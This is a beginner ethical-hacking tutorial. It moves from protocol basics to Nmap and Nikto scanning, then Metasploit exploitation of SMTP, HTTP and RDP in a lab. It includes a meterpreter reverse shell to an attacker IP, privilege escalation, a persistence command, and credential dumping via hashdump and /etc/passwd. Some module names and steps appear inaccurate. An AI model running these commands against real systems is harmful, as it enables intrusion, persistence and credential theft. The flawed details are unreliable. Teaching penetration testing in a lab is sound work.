


1. Introduction to How Computers Communicate

	•	Protocols: Computers communicate using network protocols (e.g., TCP/IP, HTTP, SMTP).
	•	TCP/IP (Transmission Control Protocol/Internet Protocol) is the basic communication language of the internet.
	•	HTTP (HyperText Transfer Protocol): Used for communication between web browsers and web servers.
	•	SMTP (Simple Mail Transfer Protocol): Used for sending emails.
	•	RDP (Remote Desktop Protocol): Used to remotely connect to and control a computer.

2. How Data is Transferred in Networks

	•	IP Addressing: Each device on a network is identified by an IP address.
	•	Public IP: Exposed to the internet.
	•	Private IP: Used within internal networks.
	•	Ports: These are gateways through which a device communicates on a network. Different services run on different ports, for example:
	•	HTTP: Port 80 (or 443 for HTTPS)
	•	SMTP: Port 25
	•	RDP: Port 3389
	•	TCP vs UDP: TCP is connection-oriented (reliable), while UDP is connectionless (faster but less reliable).

3. Setting Up Your Hacking Lab

	•	Use Kali Linux as your attacking machine.
	•	Set up virtual machines (VMs) with Vulnerable OS like Metasploitable, Windows XP, or Windows 7 for testing purposes.

Command to install necessary tools on Kali Linux:

sudo apt update && sudo apt install nmap metasploit-framework

Phase 1: Network Scanning

	•	Target: Discover open ports, services, and potential vulnerabilities.

4. Using Nmap for Network Scanning

Nmap is a powerful tool used to discover hosts and services on a network.

	•	Basic Network Scan: Discover active hosts and open ports.

nmap 192.168.1.1/24

	•	Service Version Detection:

nmap -sV 192.168.1.10

	•	Scan for All Ports: By default, Nmap scans the top 1000 ports. To scan all 65535:

nmap -p- 192.168.1.10

	•	Scan for Specific Ports (e.g., HTTP, SMTP, and RDP):

nmap -p 80,25,3389 192.168.1.10

	•	OS Detection:

nmap -O 192.168.1.10

5. Detailed Port Scanning

	•	HTTP (Port 80/443): Web service scanning.
	•	You can further test the web service using tools like Nikto to discover vulnerabilities.
	•	Run:

nikto -h http://192.168.1.10


	•	SMTP (Port 25): Mail service scanning.
	•	Enumerate email accounts:

nmap --script smtp-enum-users -p 25 192.168.1.10


	•	RDP (Port 3389): Remote Desktop Protocol.
	•	Look for vulnerabilities:

nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10



Phase 2: Using Metasploit to Exploit Vulnerabilities

	•	Target: Use known vulnerabilities to exploit the target system.

6. Getting Started with Metasploit

	•	Open Metasploit:

msfconsole

	•	Search for Exploits:
You can search for specific exploits by service, CVE number, or platform:

search smb
search ms12-020

7. Metasploit Modules

	•	Auxiliary: Scanners, fuzzers, and other utilities.
	•	Exploits: Code that takes advantage of a vulnerability.
	•	Payloads: Code that runs after an exploit is successful, like a reverse shell.
	•	Encoders: Obfuscate the payload to avoid detection by antivirus.

8. Common Exploits for SMTP, HTTP, RDP

	•	SMTP Exploit Example:
	•	Target: Exploiting an SMTP vulnerability.
	•	Use:

use exploit/windows/smtp/smtp_vrfy

	•	Set options like the target IP:

set RHOST 192.168.1.10

	•	Run the exploit:

run


	•	HTTP Exploit Example:
	•	Target: Exploiting a web server vulnerability.
	•	Use:

use exploit/multi/http/struts2_content_type

	•	Set the target IP:

set RHOST 192.168.1.10
set RPORT 80

	•	Run the exploit:

run


	•	RDP Exploit Example:
	•	Target: Exploiting an RDP vulnerability.
	•	Use:

use exploit/windows/rdp/rdp_ms12_020

	•	Set the target IP:

set RHOST 192.168.1.10

	•	Run the exploit:

run



9. Payloads: Gaining Control

Once an exploit succeeds, you’ll need a payload to gain control of the target system.

	•	Setting up a reverse shell (where the target machine connects back to you):

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.20  # Your attacker's IP
set LPORT 4444


	•	Run the exploit:

run

If successful, you’ll have a Meterpreter session on the target machine, allowing you to run commands, upload/download files, and more.

10. Post-Exploitation: What to Do After a Successful Exploit

	•	Privilege Escalation: Once inside, you can try to escalate privileges to become an administrator or root.

getsystem


	•	Persistence: Ensure access to the system is maintained even if it reboots:

persistence -U -i 10 -p 4444 -r 192.168.1.20


	•	Collecting Information: Gather sensitive data, credentials, or files:

download /etc/passwd

or

hashdump



Wrap-Up: Targeting Vectors and Ethical Considerations

Target Vectors:

	•	Open Ports: Ports expose services that might be vulnerable.
	•	Weak Configurations: Misconfigurations can lead to exploitation.
	•	Unpatched Vulnerabilities: Systems not updated with security patches are prime targets.

Ethical Hacking Mindset:

Always remember that the goal of ethical hacking is to identify vulnerabilities and secure systems, not to harm or disrupt. Use these techniques responsibly and always with permission.

Final Thoughts

This guide covers the basics of scanning, exploiting vulnerabilities, and gaining access using tools like Nmap and Metasploit. Each phase of hacking—reconnaissance, scanning, exploitation, and post-exploitation—is essential to fully understand system vulnerabilities and how attackers operate. Remember, with great power comes great responsibility. Always practice ethical hacking!
